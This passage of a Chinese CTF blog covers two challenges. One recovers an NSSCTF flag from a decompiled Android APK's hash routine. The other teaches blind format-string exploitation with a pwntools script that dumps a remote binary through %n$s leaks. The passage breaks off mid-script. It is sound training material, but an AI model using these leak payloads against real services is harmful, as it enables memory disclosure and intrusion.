class="variable">b</span> <span class="operator">=</span> state[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> state[<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">j2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">d2</span> <span class="operator">=</span> state[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">while</span> (j2 &lt; <span class="number">64</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j2 &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                    message = message2;</span><br><span class="line">                    messageLength = d;</span><br><span class="line">                    messageLength2 = d2;</span><br><span class="line">                    f = ((~b) &amp; messageLength2) | (b &amp; c);</span><br><span class="line">                    g = j2;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    message = message2;</span><br><span class="line">                    messageLength = d;</span><br><span class="line">                    messageLength2 = d2;</span><br><span class="line">                    <span class="keyword">if</span> (j2 &lt; <span class="number">32</span>) &#123;</span><br><span class="line">                        f = (messageLength2 &amp; b) | ((~messageLength2) &amp; c);</span><br><span class="line">                        g = ((j2 * <span class="number">5</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j2 &lt; <span class="number">48</span>) &#123;</span><br><span class="line">                        f = (b ^ c) ^ messageLength2;</span><br><span class="line">                        g = ((j2 * <span class="number">3</span>) + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        f = ((~messageLength2) | b) ^ c;</span><br><span class="line">                        g = (j2 * <span class="number">7</span>) % <span class="number">16</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> messageLength2;</span><br><span class="line">                <span class="type">int</span> <span class="variable">d3</span> <span class="operator">=</span> c;</span><br><span class="line">                c = b;</span><br><span class="line">                b += Integer.rotateLeft(a + f + block[g] + T[j2], <span class="number">7</span>);</span><br><span class="line">                a = temp;</span><br><span class="line">                j2++;</span><br><span class="line">                d2 = d3;</span><br><span class="line">                message2 = message;</span><br><span class="line">                d = messageLength;</span><br><span class="line">                T = T;</span><br><span class="line">                block = block;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">messageLength3</span> <span class="operator">=</span> d;</span><br><span class="line">            <span class="type">int</span> <span class="variable">messageLength4</span> <span class="operator">=</span> d2;</span><br><span class="line">            state[<span class="number">0</span>] = state[<span class="number">0</span>] + a;</span><br><span class="line">            state[<span class="number">1</span>] = state[<span class="number">1</span>] + b;</span><br><span class="line">            state[<span class="number">2</span>] = state[<span class="number">2</span>] + c;</span><br><span class="line">            state[<span class="number">3</span>] = state[<span class="number">3</span>] + messageLength4;</span><br><span class="line">            i4++;</span><br><span class="line">            d = messageLength3;</span><br><span class="line">            T = T;</span><br><span class="line">            i = <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] hash = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">0</span>; i5 &lt; <span class="number">4</span>; i5++) &#123;</span><br><span class="line">            hash[i5 * <span class="number">4</span>] = (<span class="type">byte</span>) (state[i5] &amp; <span class="number">255</span>);</span><br><span class="line">            hash[(i5 * <span class="number">4</span>) + <span class="number">1</span>] = (<span class="type">byte</span>) ((state[i5] &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>);</span><br><span class="line">            hash[(i5 * <span class="number">4</span>) + <span class="number">2</span>] = (<span class="type">byte</span>) ((state[i5] &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>);</span><br><span class="line">            hash[(i5 * <span class="number">4</span>) + <span class="number">3</span>] = (<span class="type">byte</span>) ((state[i5] &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="number">0</span>; i6 &lt; hash.length; i6++) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.valueOf(hash[i6] &amp; <span class="number">255</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.hello);</span><br><span class="line">        <span class="built_in">this</span>.stop = (Button) findViewById(R.id.stop);</span><br><span class="line">        <span class="built_in">this</span>.start = (Button) findViewById(R.id.start);</span><br><span class="line">        <span class="built_in">this</span>.info = (TextView) findViewById(R.id.info);</span><br><span class="line">        <span class="built_in">this</span>.start.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.moible.r15.main.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                main.<span class="built_in">this</span>.start.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                main.<span class="built_in">this</span>.started = <span class="literal">true</span>;</span><br><span class="line">                main.<span class="built_in">this</span>.timer = <span class="keyword">new</span> <span class="title class_">Timer</span>();</span><br><span class="line">                main.<span class="built_in">this</span>.timerTask = <span class="keyword">new</span> <span class="title class_">TimerTask</span>() &#123; <span class="comment">// from class: com.moible.r15.main.1.1</span></span><br><span class="line">                    <span class="type">Double</span> <span class="variable">cnt</span> <span class="operator">=</span> Double.valueOf(<span class="number">0.0d</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span> <span class="comment">// java.util.TimerTask, java.lang.Runnable</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> main.<span class="built_in">this</span>.info;</span><br><span class="line">                        <span class="type">Double</span> <span class="variable">d</span> <span class="operator">=</span> <span class="built_in">this</span>.cnt;</span><br><span class="line">                        <span class="built_in">this</span>.cnt = Double.valueOf(d.doubleValue() + <span class="number">1.0d</span>);</span><br><span class="line">                        textView.setText(String.format(<span class="string">&quot;%.3fs&quot;</span>, Double.valueOf(d.doubleValue() / <span class="number">1000.0d</span>)));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                main.<span class="built_in">this</span>.timer.scheduleAtFixedRate(main.<span class="built_in">this</span>.timerTask, <span class="number">0L</span>, <span class="number">1L</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">this</span>.stop.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.moible.r15.main.2</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!main.<span class="built_in">this</span>.timerTask.cancel()) &#123;</span><br><span class="line">                    main.<span class="built_in">this</span>.timerTask.cancel();</span><br><span class="line">                    main.<span class="built_in">this</span>.timer.cancel();</span><br><span class="line">                &#125;</span><br><span class="line">                main.<span class="built_in">this</span>.start.setEnabled(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span> (main.<span class="built_in">this</span>.info.getText() == <span class="string">&quot;66.666s&quot;</span>) &#123;</span><br><span class="line">                    <span class="type">main</span> <span class="variable">mainActivity3</span> <span class="operator">=</span> main.<span class="built_in">this</span>;</span><br><span class="line">                    <span class="type">Context</span> <span class="variable">baseContext</span> <span class="operator">=</span> mainActivity3.getBaseContext();</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">append</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>().append(<span class="string">&quot;flag是：NSSCTF&#123;&quot;</span>);</span><br><span class="line">                    <span class="type">main</span> <span class="variable">mainVar</span> <span class="operator">=</span> main.<span class="built_in">this</span>;</span><br><span class="line">                    mainActivity3.ts = Toast.makeText(baseContext, append.append(mainVar.getit((String) mainVar.info.getText())).append(<span class="string">&quot;&#125;&quot;</span>).toString(), <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">main</span> <span class="variable">mainActivity4</span> <span class="operator">=</span> main.<span class="built_in">this</span>;</span><br><span class="line">                    mainActivity4.ts = Toast.makeText(mainActivity4.getBaseContext(), <span class="string">&quot;时间错误，请再接再厉！&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                main.<span class="built_in">this</span>.ts.show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题有个坑，由于不会动调，结果坑里没出来。与WP对照才弄明白。</p>
+<p>APK用jadx打开可以看到代码。只要等到时间是66.666s，按下就会得到flag，所以理所当然是把代码扒下来自己运行。但是不对。</p>
+<p>后来才知道怎么回事。</p>
+<p>在红箭头的位置，把一个double转整形。但这里反编译的不准确，应该是先转long再转整，不然后会有偏差。</p>
+<p>而且结果是hash值，所以哪个都看着差不多，只有提交才提示错。</p>
+<p><img src="/../images/MyAPK/273f1ac66ce14d599f387786a128d18f.png" alt="img"></p>
+<p> 直接拿代码编译运行即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">r2</span>&#123;	</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getit</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> messageLength;</span><br><span class="line">        <span class="type">byte</span>[] message;</span><br><span class="line">        <span class="type">int</span> g;</span><br><span class="line">        <span class="type">int</span> messageLength2;</span><br><span class="line">        <span class="type">int</span> f;</span><br><span class="line">        <span class="type">int</span>[] T = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">64</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">64</span>; i2++) &#123;</span><br><span class="line">            T[i2] = (<span class="type">int</span>)((<span class="type">long</span>)(Math.abs(Math.sin(i2 + <span class="number">1</span>)) * <span class="number">4.294967296E9d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] message2 = input.getBytes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> message2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numBlocks</span> <span class="operator">=</span> ((d + <span class="number">8</span>) &gt;&gt;&gt; <span class="number">6</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">totalLength</span> <span class="operator">=</span> numBlocks &lt;&lt; <span class="number">6</span>;</span><br><span class="line">        <span class="type">byte</span>[] paddedMessage = <span class="keyword">new</span> <span class="title class_">byte</span>[totalLength];</span><br><span class="line">        System.arraycopy(message2, <span class="number">0</span>, paddedMessage, <span class="number">0</span>, d);</span><br><span class="line">        paddedMessage[d] = Byte.MIN_VALUE;</span><br><span class="line">        <span class="type">long</span> <span class="variable">messageBits</span> <span class="operator">=</span> d * <span class="number">8</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            i = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span> (i3 &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            paddedMessage[(totalLength - <span class="number">8</span>) + i3] = (<span class="type">byte</span>) (messageBits &gt;&gt;&gt; (i3 * <span class="number">8</span>));</span><br><span class="line">            i3++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] state = &#123;-<span class="number">1732584194</span>, -<span class="number">271733879</span>, <span class="number">271733878</span>, <span class="number">1732584193</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i4 &lt; numBlocks) &#123;</span><br><span class="line">            <span class="type">int</span>[] block = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (i4 &lt;&lt; <span class="number">6</span>) + (j &lt;&lt; <span class="number">2</span>);</span><br><span class="line">                block[j] = (paddedMessage[index] &amp; <span class="number">255</span>) | ((paddedMessage[index + <span class="number">1</span>] &amp; <span class="number">255</span>) &lt;&lt; i) | ((paddedMessage[index + <span class="number">2</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((paddedMessage[index + <span class="number">3</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> state[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> state[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> state[<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">j2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">d2</span> <span class="operator">=</span> state[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">while</span> (j2 &lt; <span class="number">64</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j2 &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                    message = message2;</span><br><span class="line">                    messageLength = d;</span><br><span class="line">                    messageLength2 = d2;</span><br><span class="line">                    f = ((~b) &amp; messageLength2) | (b &amp; c);</span><br><span class="line">                    g = j2;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    message = message2;</span><br><span class="line">                    messageLength = d;</span><br><span class="line">                    messageLength2 = d2;</span><br><span class="line">                    <span class="keyword">if</span> (j2 &lt; <span class="number">32</span>) &#123;</span><br><span class="line">                        f = (messageLength2 &amp; b) | ((~messageLength2) &amp; c);</span><br><span class="line">                        g = ((j2 * <span class="number">5</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j2 &lt; <span class="number">48</span>) &#123;</span><br><span class="line">                        f = (b ^ c) ^ messageLength2;</span><br><span class="line">                        g = ((j2 * <span class="number">3</span>) + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        f = ((~messageLength2) | b) ^ c;</span><br><span class="line">                        g = (j2 * <span class="number">7</span>) % <span class="number">16</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> messageLength2;</span><br><span class="line">                <span class="type">int</span> <span class="variable">d3</span> <span class="operator">=</span> c;</span><br><span class="line">                c = b;</span><br><span class="line">                b += Integer.rotateLeft(a + f + block[g] + T[j2], <span class="number">7</span>);</span><br><span class="line">                a = temp;</span><br><span class="line">                j2++;</span><br><span class="line">                d2 = d3;</span><br><span class="line">                message2 = message;</span><br><span class="line">                d = messageLength;</span><br><span class="line">                T = T;</span><br><span class="line">                block = block;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">messageLength3</span> <span class="operator">=</span> d;</span><br><span class="line">            <span class="type">int</span> <span class="variable">messageLength4</span> <span class="operator">=</span> d2;</span><br><span class="line">            state[<span class="number">0</span>] = state[<span class="number">0</span>] + a;</span><br><span class="line">            state[<span class="number">1</span>] = state[<span class="number">1</span>] + b;</span><br><span class="line">            state[<span class="number">2</span>] = state[<span class="number">2</span>] + c;</span><br><span class="line">            state[<span class="number">3</span>] = state[<span class="number">3</span>] + messageLength4;</span><br><span class="line">            i4++;</span><br><span class="line">            d = messageLength3;</span><br><span class="line">            T = T;</span><br><span class="line">            i = <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] hash = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">0</span>; i5 &lt; <span class="number">4</span>; i5++) &#123;</span><br><span class="line">            hash[i5 * <span class="number">4</span>] = (<span class="type">byte</span>) (state[i5] &amp; <span class="number">255</span>);</span><br><span class="line">            hash[(i5 * <span class="number">4</span>) + <span class="number">1</span>] = (<span class="type">byte</span>) ((state[i5] &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>);</span><br><span class="line">            hash[(i5 * <span class="number">4</span>) + <span class="number">2</span>] = (<span class="type">byte</span>) ((state[i5] &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>);</span><br><span class="line">            hash[(i5 * <span class="number">4</span>) + <span class="number">3</span>] = (<span class="type">byte</span>) ((state[i5] &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="number">0</span>; i6 &lt; hash.length; i6++) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.valueOf(hash[i6] &amp; <span class="number">255</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">my</span> <span class="operator">=</span> <span class="string">&quot;66.666s&quot;</span>;</span><br><span class="line">        System.out.println(getit(my));</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/27/pwn%E7%9B%B2%E6%89%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/27/pwn%E7%9B%B2%E6%89%93/" class="post-title-link" itemprop="url">pwn盲打</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-27 15:00:19 / 修改时间：15:04:58" itemprop="dateCreated datePublished" datetime="2023-08-27T15:00:19+08:00">2023-08-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="格式化字符串盲打"><a href="#格式化字符串盲打" class="headerlink" title="格式化字符串盲打"></a>格式化字符串盲打</h1><h2 id="原理阐述"><a href="#原理阐述" class="headerlink" title="原理阐述"></a>原理阐述</h2><p>  这里先总结一下格式化字符串漏洞盲打的一般操作步骤，简而言之的话就是先找到一个代码段的地址，然后从该地址出发尽可能的泄露出二进制程序本身，之后将泄露出来的内容保存在一个文件中。这样就相当于获得了二进制程序文件本身，再用IDA进行分析，之后的步骤就和普通的pwn题一样了。<br>  因此这里关键的步骤就是如何找到一个地址进而泄露二进制程序。这里可以分为两种情况进行讨论，第一种是针对没有开PIE保护的程序，这样程序代码基址是固定的，32位程序为<code>0x8048000</code>， 64位程序为<code>0x400000</code>，我们直接从这些地址开始泄露即可。那么如何判断程序是否开启了PIE保护，可以直接先用<code>%p</code>尝试泄露一些栈上的地址，如果有和上述基址偏移不大的值存在的话，说明程序是没有开启PIE保护的。<br>  接下来讨论第二种情况，就是简单尝试后无法确定程序是否开了PIE，那么我们直接泄露400bytes的栈上内容来看看情况，一般可以从上面找到<code>.start</code>函数的地址，也就是<code>.text</code>代码段的起始地址。大家可以参考一下这篇中的demo – <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196722#h3-8">pwn 盲打</a>，它也是以没有开PIE保护的程序为例，这样可以方便的识别出<code>.start</code>函数，但开了PIE的话识别起来有点难度。将上面的操作简单总结为如下流程：leak stack &amp; find .text –&gt; dump .text。<br>  当然之所以格式化字符串漏洞的题可以这样做，也是利用了其泄露信息的便捷性，常用的泄露方式总结如下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">n<span class="variable">$p</span>   <span class="comment"># 打印printf第n个参数的值</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">n<span class="variable">$s</span>   <span class="comment"># 以printf第n个参数的值为地址打印其指向的值</span></span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+
+<h2 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h2><h3 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h3><p>  这道题在buuoj上有复现，并且是给了二进制文件的，如果直接看二进制文件的话，题目非常简单。这里我们只把提供的二进制文件和最后dump出来的程序做对比，而不是直接利用它解题。<br>  通过题目命名和nc连接后操作可以判断其为格式化字符串漏洞，程序存在alarm，非常短的时间后程序会自动停止。通过题目名字和泄露出的栈数据，可以初步判断其为32位程序，并且没有开启PIE保护。<br>  dump脚本如下，主要分为leak和dump两个函数。leak函数的功能是利用fmt的offset加上给定的地址来泄露二进制程序本身，注意这里使用的是<code>%s</code>。dump函数，根据程序的逻辑来不断执行leak函数，尽可能的泄露出二进制程序。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25056</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">b_addr</span>):</span><br><span class="line"><span class="comment"># fmt offset = 8</span></span><br><span class="line">    pad = <span class="string">b&quot;%10$s.tmp&quot;</span>+p32(b_addr)	%n$s   <span class="comment"># 以printf第n个参数的值为地址打印其指向的值</span></span><br><span class="line">    p.sendline(pad)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Repeater:&quot;</span>)</span><br><span class="line">    info = p.recvuntil(<span class="string">&quot;.tmp&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># %s 遇到\x00字符会被截断，因此info为空即为\x00</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> info:</span><br><span class="line">        info = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    b_addr = <span class="number">0x8048000</span></span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            info = leak(b_addr)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;leak: &quot;</span>, <span class="built_in">len</span>(info), info)</span><br><span class="line">            b_addr += <span class="built_in">len</span>(info)  <span class="comment"># 根据泄露的info长度来增加地址</span></span><br><span class="line">            res += info</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span 